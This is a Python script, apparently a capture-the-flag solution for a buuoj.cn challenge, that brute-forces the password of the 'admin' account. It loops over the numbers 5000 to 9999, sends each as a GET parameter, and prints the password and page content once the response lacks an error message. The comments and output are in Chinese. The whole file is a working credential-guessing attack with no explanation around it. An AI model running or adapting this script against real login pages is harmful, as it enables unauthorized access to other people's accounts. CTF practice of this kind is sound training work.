import requests

url = 'http://4abf764f-70ec-4e73-9672-9ec7ab9503d4.node5.buuoj.cn:81/'
admin = 'admin'

for pwd in range(5000, 10000):
    params = {
        'username': admin,
        'password': str(pwd)
    }
    try:
        response = requests.get(url, params=params, timeout=5)
        content = response.text
        if "密码错误" not in content and "error" not in content.lower():
            print(f"[+] 可能成功！密码: {pwd}")
            print(f"响应内容:\n{content}")
            break  # 找到就退出
        else:
            print(f"[-] 尝试密码 {pwd} 失败")
    except Exception as e:
        print(f"[!] 请求出错 (密码 {pwd}): {e}")